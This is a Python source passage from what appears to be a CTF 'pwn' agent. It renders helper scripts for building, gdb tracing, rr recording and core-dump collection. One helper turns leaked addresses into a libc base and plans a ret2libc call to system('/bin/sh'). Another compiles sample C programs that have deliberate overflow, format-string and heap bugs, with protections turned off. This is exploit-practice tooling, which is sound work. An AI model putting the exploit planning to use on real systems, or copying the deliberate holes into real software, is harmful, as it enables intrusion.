        fmt = "elf32" if MODE == "multilib" else "elf64"
        for src in asm_like:
            obj_path = os.path.join(build_dir, os.path.basename(src) + ".o")
            payload["steps"].append(run_capture(["nasm", "-f", fmt, src, "-o", obj_path], timeout=180, env=env))
            objects.append(obj_path)
    compiler = "g++" if cpp_like else "gcc"
    if not shutil.which(compiler):
        payload["message"] = "{0} is not installed".format(compiler)
        print(json.dumps(payload, ensure_ascii=False, indent=2))
        raise SystemExit(0)
    payload["compile_strategy"] = "direct-{0}".format(compiler)
    payload["steps"].append(run_capture([compiler] + cflags + c_like + cpp_like + objects + ["-o", os.path.join(build_dir, binary_name)] + ldflags, timeout=600, env=env))
payload["selected_binary"] = locate_binary()
if payload["selected_binary"]:
    payload["status"] = "ok"
    payload["binary_path"] = payload["selected_binary"]
    if shutil.which("file"):
        payload["file_report"] = run_capture(["file", payload["selected_binary"]], timeout=20)
    if shutil.which("checksec"):
        payload["checksec_report"] = run_checksec(payload["selected_binary"], timeout=20)
else:
    payload["message"] = "build finished without producing a detectable executable"
print(json.dumps(payload, ensure_ascii=False, indent=2))
"""
        return textwrap.dedent(template).replace("__MODE__", repr(str(mode or "native")), 1)

    def _render_pwn_gdb_batch_trace_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, os, re, shutil, subprocess, sys, tempfile
            spec = json.loads(sys.argv[1] or "{}")
            sample_path = str(spec.get("sample_path") or "")
            binary_name = str(spec.get("binary_name") or os.path.basename(sample_path) or "chall")
            program_args = [str(item) for item in list(spec.get("program_args") or [])]
            stdin_data = str(spec.get("stdin_data") or "")
            gdb_commands = [str(item) for item in list(spec.get("gdb_commands") or []) if str(item)]
            payload = {"status": "error", "sample_path": sample_path, "binary_name": binary_name, "program_args": program_args, "stdin_len": len(stdin_data), "pwndbg_or_gef": ""}
            ansi_re = re.compile(r"\\x1b\\[[0-?]*[ -/]*[@-~]")
            osc_re = re.compile(r"\\x1b\\][^\\x07]*(?:\\x07|\\x1b\\\\)")
            noise_patterns = [
                re.compile(r"^(gef|pwndbg|gdb)\\s*[>➤].*$", re.IGNORECASE),
                re.compile(r"^reading symbols from .*", re.IGNORECASE),
                re.compile(r"^pwndbg:.*", re.IGNORECASE),
                re.compile(r"^gef:.*", re.IGNORECASE),
                re.compile(r"^\\[legend:.*", re.IGNORECASE),
                re.compile(r"^remote debugging using .*", re.IGNORECASE),
            ]

            def strip_ansi(text):
                cleaned = osc_re.sub("", text or "")
                cleaned = ansi_re.sub("", cleaned)
                return cleaned.replace("\\r\\n", "\\n").replace("\\r", "\\n")

            def clean_trace_text(text):
                cleaned_lines = []
                blank_run = 0
                for raw in strip_ansi(text).split("\\n"):
                    line = raw.rstrip()
                    compact = line.strip()
                    if compact and any(pattern.match(compact) for pattern in noise_patterns):
                        continue
                    if not compact:
                        blank_run += 1
                        if blank_run > 1:
                            continue
                        cleaned_lines.append("")
                        continue
                    blank_run = 0
                    cleaned_lines.append(line)
                return "\\n".join(cleaned_lines).strip()

            def extract_section(text, start_marker, end_marker=""):
                if start_marker not in text:
                    return ""
                chunk = text.split(start_marker + "\\n", 1)[1]
                if end_marker and end_marker in chunk:
                    chunk = chunk.split(end_marker + "\\n", 1)[0]
                return chunk.strip()[:4000]

            gdb = shutil.which("gdb")
            if not gdb:
                payload["message"] = "gdb is not installed"
                print(json.dumps(payload, ensure_ascii=False, indent=2))
                raise SystemExit(0)
            gdbinit_path = os.path.expanduser("~/.gdbinit")
            if os.path.isfile(gdbinit_path):
                try:
                    gdbinit_text = open(gdbinit_path, "r", encoding="utf-8", errors="replace").read().lower()
                    payload["pwndbg_or_gef"] = "pwndbg" if "pwndbg" in gdbinit_text else ("gef" if "gef" in gdbinit_text else "")
                except Exception:
                    payload["pwndbg_or_gef"] = ""
            stdin_path = ""
            try:
                if stdin_data:
                    with tempfile.NamedTemporaryFile(prefix="ctf-agent-gdb-", suffix=".txt", delete=False, mode="w", encoding="utf-8") as handle:
                        handle.write(stdin_data)
                        stdin_path = handle.name
                command = [
                    gdb,
                    "-q",
                    "-batch",
                    "-ex",
                    "set pagination off",
                    "-ex",
                    "set confirm off",
                ]
                for item in gdb_commands[:8]:
                    command.extend(["-ex", item])
                command.extend(
                    [
                        "-ex",
                        "run < {0}".format(stdin_path) if stdin_path else "run",
                        "-ex",
                        'printf "===REGISTERS===\\n"',
                        "-ex",
                        "info registers",
                        "-ex",
                        'printf "===STACK===\\n"',
                        "-ex",
                        "x/32gx $sp",
                        "-ex",
                        'printf "===BACKTRACE===\\n"',
                        "-ex",
                        "bt",
                        "--args",
                        sample_path,
                    ]
                    + program_args
                )
                completed = subprocess.run(command, capture_output=True, text=True, timeout=90)
                raw_trace_text = (completed.stdout or "") + "\\n" + (completed.stderr or "")
                trace_text = clean_trace_text(raw_trace_text)
                signal_match = re.search(r"Program received signal\\s+([^,\\n]+)", trace_text)
                registers_excerpt = extract_section(trace_text, "===REGISTERS===", "===STACK===")
                stack_excerpt = extract_section(trace_text, "===STACK===", "===BACKTRACE===")
                backtrace_excerpt = extract_section(trace_text, "===BACKTRACE===", "===TRACE-END===")
                payload.update(
                    {
                        "status": "ok",
                        "returncode": completed.returncode,
                        "signal": signal_match.group(1) if signal_match else "",
                        "raw_trace_excerpt": strip_ansi(raw_trace_text)[:16000],
                        "trace_excerpt": trace_text[:16000],
                        "registers_excerpt": registers_excerpt,
                        "stack_excerpt": stack_excerpt,
                        "backtrace_excerpt": backtrace_excerpt,
                        "trace_summary": "cleaned gdb batch trace collected for {0}".format(binary_name),
                    }
                )
            except Exception as exc:
                payload["message"] = str(exc)
            finally:
                if stdin_path and os.path.exists(stdin_path):
                    try:
                        os.remove(stdin_path)
                    except Exception:
                        pass
            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_pwn_rr_record_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, os, re, shutil, subprocess, sys, tempfile
            spec = json.loads(sys.argv[1] or "{}")
            sample_path = str(spec.get("sample_path") or "")
            binary_name = str(spec.get("binary_name") or os.path.basename(sample_path) or "chall")
            program_args = [str(item) for item in list(spec.get("program_args") or [])]
            stdin_data = str(spec.get("stdin_data") or "")
            payload = {
                "status": "error",
                "sample_path": sample_path,
                "binary_name": binary_name,
                "program_args": program_args,
                "stdin_len": len(stdin_data),
                "trace_dir": "",
                "signal": "",
                "replay_hint": "",
            }
            rr = shutil.which("rr")
            if not rr:
                payload["message"] = "rr is not installed"
                print(json.dumps(payload, ensure_ascii=False, indent=2))
                raise SystemExit(0)
            stdin_path = ""
            stdin_handle = None
            trace_root = tempfile.mkdtemp(prefix="ctf-agent-rr-")
            trace_dir = os.path.join(trace_root, "trace")
            try:
                if stdin_data:
                    with tempfile.NamedTemporaryFile(prefix="ctf-agent-rr-stdin-", suffix=".txt", delete=False, mode="w", encoding="utf-8") as handle:
                        handle.write(stdin_data)
                        stdin_path = handle.name
                    stdin_handle = open(stdin_path, "r", encoding="utf-8", errors="replace")
                command = [rr, "record", "-n", "-o", trace_dir, sample_path] + program_args
                completed = subprocess.run(command, stdin=stdin_handle, capture_output=True, text=True, timeout=120)
                trace_blob = ((completed.stdout or "") + "\\n" + (completed.stderr or "")).strip()
                signal_match = re.search(r"(SIG[A-Z]+)", trace_blob)
                trace_has_data = os.path.isdir(trace_dir) and bool(os.listdir(trace_dir))
                record_status = "ok" if completed.returncode == 0 and trace_has_data else ("warn" if trace_has_data else ("warn" if completed.returncode == 0 else "error"))
                trace_summary = "rr trace recorded for {0}".format(binary_name)
                if trace_has_data and completed.returncode != 0:
                    trace_summary = "rr trace directory created but record exited with code {0}".format(completed.returncode)
                elif not trace_has_data:
                    trace_summary = "rr did not leave a usable trace directory"
                payload.update(
                    {
                        "status": record_status,
                        "trace_dir": trace_dir,
                        "signal": signal_match.group(1) if signal_match else "",
                        "record_returncode": completed.returncode,
                        "record_stdout": (completed.stdout or "")[:12000],
                        "record_stderr": (completed.stderr or "")[:6000],
                        "replay_hint": "rr replay {0}".format(trace_dir) if record_status == "ok" else "",
                        "trace_summary": trace_summary,
                    }
                )
            except Exception as exc:
                payload["message"] = str(exc)
            finally:
                try:
                    if stdin_handle:
                        stdin_handle.close()
                except Exception:
                    pass
                if stdin_path and os.path.exists(stdin_path):
                    try:
                        os.remove(stdin_path)
                    except Exception:
                        pass
            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_pwn_corefile_collect_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, os, resource, shutil, subprocess, sys, tempfile, time
            spec = json.loads(sys.argv[1] or "{}")
            sample_path = str(spec.get("sample_path") or "")
            binary_name = str(spec.get("binary_name") or os.path.basename(sample_path) or "chall")
            program_args = [str(item) for item in list(spec.get("program_args") or [])]
            stdin_data = str(spec.get("stdin_data") or "")
            payload = {"status": "warn", "sample_path": sample_path, "binary_name": binary_name, "program_args": program_args, "corefile_path": ""}
            def run_checksec(path):
                if not shutil.which("checksec"):
                    return ""
                try:
                    checksec = subprocess.run(["checksec", "--file", path], capture_output=True, text=True, timeout=10)
                    text = ((checksec.stdout or "") + (checksec.stderr or ""))
                    if "unknown option file" in text.lower() or "no option selected" in text.lower():
                        checksec = subprocess.run(["checksec", "--file=" + path], capture_output=True, text=True, timeout=10)
                        text = ((checksec.stdout or "") + (checksec.stderr or ""))
                    if "unknown option file" in text.lower() or "no option selected" in text.lower():
                        checksec = subprocess.run(["checksec", path], capture_output=True, text=True, timeout=10)
                        text = ((checksec.stdout or "") + (checksec.stderr or ""))
                    return text[:4000]
                except Exception:
                    return ""
            stdin_path = ""
            stdin_handle = None
            cwd = os.path.dirname(sample_path) or os.getcwd()
            before = {name: os.path.getmtime(os.path.join(cwd, name)) for name in os.listdir(cwd) if name.startswith("core")} if os.path.isdir(cwd) else {}
            try:
                try:
                    resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
                except Exception:
                    pass
                if stdin_data:
                    with tempfile.NamedTemporaryFile(prefix="ctf-agent-core-", suffix=".txt", delete=False, mode="w", encoding="utf-8") as handle:
                        handle.write(stdin_data)
                        stdin_path = handle.name
                    stdin_handle = open(stdin_path, "r", encoding="utf-8", errors="replace")
                started = time.time()
                completed = subprocess.run([sample_path] + program_args, cwd=cwd, stdin=stdin_handle, capture_output=True, text=True, timeout=20)
                after = {name: os.path.getmtime(os.path.join(cwd, name)) for name in os.listdir(cwd) if name.startswith("core")} if os.path.isdir(cwd) else {}
                updated_files = sorted(name for name, mtime in after.items() if name not in before or mtime > before.get(name, 0))
                core_candidates = updated_files or sorted(after)
                core_path = os.path.join(cwd, core_candidates[-1]) if core_candidates else ""
                payload.update({"status": "ok" if core_path else "warn", "returncode": completed.returncode, "stdout": (completed.stdout or "")[:12000], "stderr": (completed.stderr or "")[:6000], "duration_sec": round(time.time() - started, 4), "corefile_path": core_path})
                if shutil.which("file"):
                    payload["file_report"] = subprocess.run(["file", sample_path], capture_output=True, text=True, timeout=10).stdout[:4000]
                if shutil.which("checksec"):
                    payload["checksec_report"] = run_checksec(sample_path)
            except Exception as exc:
                payload["status"] = "error"
                payload["message"] = str(exc)
            finally:
                try:
                    if stdin_handle:
                        stdin_handle.close()
                except Exception:
                    pass
                if stdin_path and os.path.exists(stdin_path):
                    try:
                        os.remove(stdin_path)
                    except Exception:
                        pass
            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_pwn_libc_ident_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import hashlib, json, os, re, shutil, subprocess, sys
            spec = json.loads(sys.argv[1] or "{}")
            sample_path = str(spec.get("sample_path") or "")
            libc_path = str(spec.get("libc_path") or "")
            ld_path = str(spec.get("ld_path") or "")
            leaks = [str(item) for item in list(spec.get("leaks") or []) if str(item)]
            payload = {
                "status": "ok",
                "sample_path": sample_path,
                "libc_path": libc_path,
                "ld_path": ld_path,
                "leaks": leaks,
                "summary": "",
                "stage_status": "classified-only",
                "stage2_generated": False,
                "leak_artifacts": [],
                "resolved_libc_context": {},
                "stage2_payload": {},
                "exploit_transcript": {},
            }

            SYMBOL_CANDIDATES = [
                "puts",
                "printf",
                "read",
                "write",
                "open",
                "openat",
                "__libc_start_main",
                "system",
                "execve",
                "dup2",
                "setcontext",
                "__free_hook",
                "__malloc_hook",
                "environ",
            ]

            def run_text(command, timeout=15):
                try:
                    completed = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
                    return ((completed.stdout or "") + "\\n" + (completed.stderr or "")).strip()
                except Exception:
                    return ""

            def normalize_symbol(text):
                value = str(text or "").strip()
                if not value:
                    return ""
                if "=" in value and value.split("=", 1)[0].strip().lower() in {"leak_symbol", "symbol"}:
                    value = value.split("=", 1)[1]
                if "=" in value and value.split("=", 1)[0].strip().lower() in {"leak_got", "got"}:
                    value = value.split("=", 1)[1]
                value = value.strip()
                if "@got" in value.lower():
                    value = value.split("@", 1)[0]
                value = value.split("@@", 1)[0].split("@", 1)[0]
                value = value.replace("<", "").replace(">", "").strip()
                return value

            def summarize_file(path):
                if not path or not os.path.exists(path):
                    return {}
                blob = open(path, "rb").read()
                summary = {"path": path, "size": len(blob), "sha256": hashlib.sha256(blob).hexdigest()}
                if shutil.which("file"):
                    try:
                        summary["file"] = subprocess.run(["file", path], capture_output=True, text=True, timeout=10).stdout.strip()[:400]
                    except Exception:
                        summary["file"] = ""
                if shutil.which("strings"):
                    try:
                        strings = subprocess.run(["strings", "-a", path], capture_output=True, text=True, timeout=12).stdout
                        summary["glibc_versions"] = sorted(set(re.findall(r"GLIBC_[0-9.]+", strings)))[-8:]
                    except Exception:
                        summary["glibc_versions"] = []
                if shutil.which("readelf"):
                    note_text = run_text(["readelf", "-n", path], timeout=12)
                    build_id = re.search(r"Build ID:\\s*([0-9a-fA-F]+)", note_text)
                    summary["build_id"] = build_id.group(1) if build_id else ""
                return summary

            def collect_symbol_offsets(path):
                offsets = {}
                if not path or not os.path.exists(path):
                    return offsets
                outputs = []
                if shutil.which("readelf"):
                    outputs.append(("readelf", run_text(["readelf", "-Ws", path], timeout=20)))
                if shutil.which("nm"):
                    outputs.append(("nm", run_text(["nm", "-D", path], timeout=20)))
                for kind, text in outputs:
                    if not text:
                        continue
                    for raw in text.splitlines():
                        line = raw.strip()
                        if not line:
                            continue
                        symbol = ""
                        offset_text = ""
                        if kind == "readelf":
                            match = re.match(r"^\\d+:\\s*([0-9a-fA-F]+)\\s+\\d+\\s+\\w+\\s+\\w+\\s+\\w+\\s+\\w+\\s+(.+)$", line)
                            if not match:
                                continue
                            offset_text = match.group(1)
                            symbol = normalize_symbol(match.group(2).split()[0])
                        else:
                            match = re.match(r"^([0-9a-fA-F]+)\\s+\\w\\s+(.+)$", line)
                            if not match:
                                continue
                            offset_text = match.group(1)
                            symbol = normalize_symbol(match.group(2).split()[0])
                        if not symbol or symbol in offsets:
                            continue
                        try:
                            offsets[symbol] = int(offset_text, 16)
                        except Exception:
                            continue
                filtered = {}
                for name in SYMBOL_CANDIDATES:
                    if name in offsets:
                        filtered[name] = offsets[name]
                return filtered

            def find_binsh_offset(path):
                if not path or not os.path.exists(path) or not shutil.which("strings"):
                    return None
                text = run_text(["strings", "-a", "-t", "x", path], timeout=20)
                for raw in text.splitlines():
                    if "/bin/sh" not in raw:
                        continue
                    match = re.match(r"^\\s*([0-9a-fA-F]+)\\s+/bin/sh", raw)
                    if match:
                        try:
                            return int(match.group(1), 16)
                        except Exception:
                            return None
                return None

            def parse_leak_entries(items):
                entries = []
                leak_symbol_hint = ""
                leak_got_hint = ""
                return_to_hint = ""
                for raw in list(items or []):
                    text = str(raw or "").strip()
                    if not text:
                        continue
                    entry = {"raw": text, "symbol": "", "address": None, "kind": "hint"}
                    kv_match = re.match(r"^([A-Za-z_][A-Za-z0-9_@./+-]*)\\s*[:=]\\s*(0x[0-9a-fA-F]+)$", text)
                    if kv_match:
                        entry["symbol"] = normalize_symbol(kv_match.group(1))
                        entry["address"] = int(kv_match.group(2), 16)
                        entry["kind"] = "symbol-address"
                    elif re.match(r"^0x[0-9a-fA-F]+$", text):
                        entry["address"] = int(text, 16)
                        entry["kind"] = "address"
                    elif "=" in text:
                        key, value = text.split("=", 1)
                        key = key.strip().lower()
                        value = value.strip()
                        if key in {"leak_symbol", "symbol"}:
                            leak_symbol_hint = normalize_symbol(value)
                            entry["symbol"] = leak_symbol_hint
                            entry["kind"] = "symbol-hint"
                        elif key in {"leak_got", "got"}:
                            leak_got_hint = value
                            entry["symbol"] = normalize_symbol(value)
                            entry["kind"] = "got-hint"
                        elif key in {"return_to", "fallback"}:
                            return_to_hint = value
                            entry["kind"] = "return-hint"
                    elif "@got" in text.lower():
                        leak_got_hint = text
                        entry["symbol"] = normalize_symbol(text)
                        entry["kind"] = "got-hint"
                    elif "<" in text and "0x" in text:
                        pointer_match = re.search(r"(0x[0-9a-fA-F]+)\\s*<([^>]+)>", text)
                        if pointer_match:
                            entry["address"] = int(pointer_match.group(1), 16)
                            entry["symbol"] = normalize_symbol(pointer_match.group(2))
                            entry["kind"] = "backtrace-leak"
                    if not entry["symbol"] and not entry["address"] and entry["kind"] == "hint":
                        symbol_hint = normalize_symbol(text)
                        if symbol_hint and re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", symbol_hint):
                            entry["symbol"] = symbol_hint
                            entry["kind"] = "symbol-hint"
                    if entry["symbol"] or entry["address"] is not None or entry["kind"] != "hint":
                        entries.append(entry)
                        if entry["symbol"] and not leak_symbol_hint:
                            leak_symbol_hint = entry["symbol"]
                return entries[:8], leak_symbol_hint, leak_got_hint, return_to_hint

            def maybe_hex(value):
                return hex(int(value)) if isinstance(value, int) else ""

            payload["resolved_libc_context"]["libc"] = summarize_file(libc_path)
            payload["resolved_libc_context"]["ld"] = summarize_file(ld_path)
            if sample_path and os.path.exists(sample_path) and shutil.which("ldd"):
                try:
                    ldd = subprocess.run(["ldd", sample_path], capture_output=True, text=True, timeout=10)
                    payload["resolved_libc_context"]["ldd"] = ((ldd.stdout or "") + (ldd.stderr or ""))[:4000]
                except Exception:
                    payload["resolved_libc_context"]["ldd"] = ""

            normalized_leaks, leak_symbol_hint, leak_got_hint, return_to_hint = parse_leak_entries(leaks)
            symbol_offsets = collect_symbol_offsets(libc_path)
            binsh_offset = find_binsh_offset(libc_path)
            if binsh_offset is not None:
                symbol_offsets["str_bin_sh"] = int(binsh_offset)

            base_candidates = []
            chosen_base = None
            for item in normalized_leaks:
                symbol = str(item.get("symbol") or "")
                address = item.get("address")
                if address is None or not symbol or symbol not in symbol_offsets:
                    continue
                candidate = int(address) - int(symbol_offsets[symbol])
                base_candidates.append(
                    {
                        "symbol": symbol,
                        "leak": maybe_hex(address),
                        "offset": maybe_hex(symbol_offsets[symbol]),
                        "base": maybe_hex(candidate),
                    }
                )
            if base_candidates:
                chosen_base = int(base_candidates[0]["base"], 16)

            payload["leak_artifacts"] = normalized_leaks
            payload["resolved_libc_context"].update(
                {
                    "normalized_leaks": normalized_leaks,
                    "leak_symbol": leak_symbol_hint,
                    "leak_got": leak_got_hint,
                    "return_to": return_to_hint,
                    "symbol_offsets": {name: maybe_hex(offset) for name, offset in symbol_offsets.items()},
                    "base_candidates": base_candidates,
                    "chosen_base": maybe_hex(chosen_base),
                    "bin_sh_offset": maybe_hex(binsh_offset) if binsh_offset is not None else "",
                }
            )

            leak_symbol = leak_symbol_hint or next(
                (str(item.get("symbol") or "") for item in normalized_leaks if str(item.get("symbol") or "")),
                "",
            )
            system_offset = symbol_offsets.get("system")
            binsh_value = symbol_offsets.get("str_bin_sh")
            free_hook_offset = symbol_offsets.get("__free_hook")
            setcontext_offset = symbol_offsets.get("setcontext")
            if leak_symbol and leak_symbol in symbol_offsets and system_offset is not None and binsh_value is not None:
                stage2_payload = {
                    "kind": "ret2libc-stage2",
                    "leak_symbol": leak_symbol,
                    "formula": "libc_base = leak_{0} - {1}".format(leak_symbol, maybe_hex(symbol_offsets[leak_symbol])),
                    "preview": "resolve libc base, then call system('/bin/sh')",
                    "return_to": return_to_hint,
                    "addresses": {},
                    "offsets": {
                        "leak_symbol": maybe_hex(symbol_offsets[leak_symbol]),
                        "system": maybe_hex(system_offset),
                        "str_bin_sh": maybe_hex(binsh_value),
                    },
                }
                if free_hook_offset is not None:
                    stage2_payload["offsets"]["__free_hook"] = maybe_hex(free_hook_offset)
                if setcontext_offset is not None:
                    stage2_payload["offsets"]["setcontext"] = maybe_hex(setcontext_offset)
                if chosen_base is not None:
                    stage2_payload["addresses"] = {
                        "libc_base": maybe_hex(chosen_base),
                        "system": maybe_hex(chosen_base + int(system_offset)),
                        "str_bin_sh": maybe_hex(chosen_base + int(binsh_value)),
                    }
                    if free_hook_offset is not None:
                        stage2_payload["addresses"]["__free_hook"] = maybe_hex(chosen_base + int(free_hook_offset))
                    if setcontext_offset is not None:
                        stage2_payload["addresses"]["setcontext"] = maybe_hex(chosen_base + int(setcontext_offset))
                    stage2_payload["preview"] = "resolved libc base from leak and synthesized concrete stage-2 call targets"
                payload["stage2_payload"] = stage2_payload
                payload["stage2_generated"] = True
                payload["stage_status"] = "stage2-synthesized"
                payload["summary"] = "normalized libc context and synthesized a leak-to-stage2 ret2libc plan"
                payload["exploit_transcript"] = {
                    "status": "stage2-ready",
                    "preview": "{0}; system={1}; /bin/sh={2}".format(
                        stage2_payload["formula"],
                        stage2_payload.get("addresses", {}).get("system") or stage2_payload["offsets"].get("system", ""),
                        stage2_payload.get("addresses", {}).get("str_bin_sh") or stage2_payload["offsets"].get("str_bin_sh", ""),
                    ),
                }
            elif normalized_leaks or leak_symbol_hint or symbol_offsets:
                payload["stage_status"] = "stage1-ready"
                payload["summary"] = "normalized libc metadata and leak hints; stage-2 still needs one confirmed leak symbol/base pair"
                payload["exploit_transcript"] = {
                    "status": "stage1-ready",
                    "preview": "leak_symbol={0} symbol_offsets={1}".format(
                        leak_symbol_hint or "pending",
                        ",".join(sorted(symbol_offsets.keys())[:6]),
                    ),
                }
            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_pwn_regress_build_pack_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, os, shutil, subprocess, sys
            from pathlib import Path
            spec = json.loads(sys.argv[1] or "{}")
            output_root = Path(str(spec.get("output_root") or "/tmp/ctf-agent-regress-pack")).expanduser()
            case_prefix = str(spec.get("case_prefix") or "case-native").strip() or "case-native"
            output_root.mkdir(parents=True, exist_ok=True)
            cases = {
                "ret2win": "#include <stdio.h>\\n#include <stdlib.h>\\n#include <unistd.h>\\nvoid win(){system(\\\"/bin/sh\\\");}\\nint main(){char buf[64]; puts(\\\"ret2win\\\"); read(0, buf, 256); return 0;}",
                "ret2libc": "#include <stdio.h>\\n#include <unistd.h>\\nint main(){char buf[64]; puts(\\\"puts leak here\\\"); read(0, buf, 256); return 0;}",
                "format-string": "#include <stdio.h>\\nint main(){char buf[128]; fgets(buf, sizeof(buf), stdin); printf(buf); return 0;}",
                "seccomp-orw": "#include <stdio.h>\\nint main(){puts(\\\"seccomp open read write sandbox\\\"); return 0;}",
                "srop": "#include <stdio.h>\\n#include <unistd.h>\\nvoid gadget(){ __asm__(\\\"syscall; ret\\\"); }\\nint main(){char buf[64]; read(0, buf, 256); return 0;}",
                "ret2dlresolve": "#include <stdio.h>\\n#include <unistd.h>\\nint main(){char buf[64]; puts(\\\"ret2dlresolve link_map r_info\\\"); read(0, buf, 256); return 0;}",
                "heap-uaf": "#include <stdio.h>\\n#include <stdlib.h>\\n#include <unistd.h>\\nint main(){char *p=malloc(0x40); free(p); read(0,p,0x40); puts(\\\"uaf\\\"); return 0;}",
                "heap-tcache-poison": "#include <stdio.h>\\n#include <stdlib.h>\\nint main(){char *a=malloc(0x40); char *b=malloc(0x40); free(a); free(b); puts(\\\"tcache poison\\\"); return 0;}",
            }
            def run_capture(command, cwd=None, timeout=180):
                try:
                    completed = subprocess.run(command, capture_output=True, text=True, timeout=timeout, cwd=cwd)
                    return {"command": list(command), "returncode": completed.returncode, "stdout": (completed.stdout or "")[:8000], "stderr": (completed.stderr or "")[:8000]}
                except Exception as exc:
                    return {"command": list(command), "returncode": -1, "stdout": "", "stderr": str(exc)}
            if not shutil.which("gcc"):
                print(json.dumps({"status": "error", "message": "gcc is not installed", "output_root": str(output_root), "cases": []}, ensure_ascii=False, indent=2))
                raise SystemExit(0)
            results = []
            for name, source in cases.items():
                case_dir = output_root / ("{0}-{1}".format(case_prefix, name))
                case_dir.mkdir(parents=True, exist_ok=True)
                source_path = case_dir / "chall.c"
                binary_path = case_dir / "chall"
                source_path.write_text(source, encoding="utf-8")
                result = run_capture(["gcc", "-fno-stack-protector", "-z", "execstack", "-no-pie", str(source_path), "-o", str(binary_path)], cwd=str(case_dir))
                if result["returncode"] == 0:
                    (case_dir / "case.json").write_text(json.dumps({"title": name, "category": "pwn", "attachments": [str(binary_path)], "description": "real ELF corpus built on remote helper"}, ensure_ascii=False, indent=2), encoding="utf-8")
                results.append({"name": name, "case_dir": str(case_dir), "binary_path": str(binary_path), "build": result, "built": result["returncode"] == 0})
            print(json.dumps({"status": "ok" if results and all(item.get("built") for item in results) else "warn", "output_root": str(output_root), "cases": results}, ensure_ascii=False, indent=2))
            """
        )

    def _normalize_remote_path(self, remote_path):
        text = str(remote_path or self.DEFAULT_BASE_DIR).replace("\\", "/")
        return text if text.startswith("/") else "/" + text.lstrip("/")

    def _extract_first_line(self, text):
        if not text:
            return ""
        return str(text).strip().splitlines()[0].strip()

    def _missing_host(self, host_name):
        return {
            "status": "missing",
            "message": "remote host is not configured",
            "host": host_name,
        }

    def _error_payload(self, host_name, **kwargs):
        payload = {
            "status": "error",
            "host": host_name,
        }
        payload.update(kwargs)
        return payload

    def _close(self, handle):
        try:
            if handle:
                handle.close()
        except Exception:
            pass
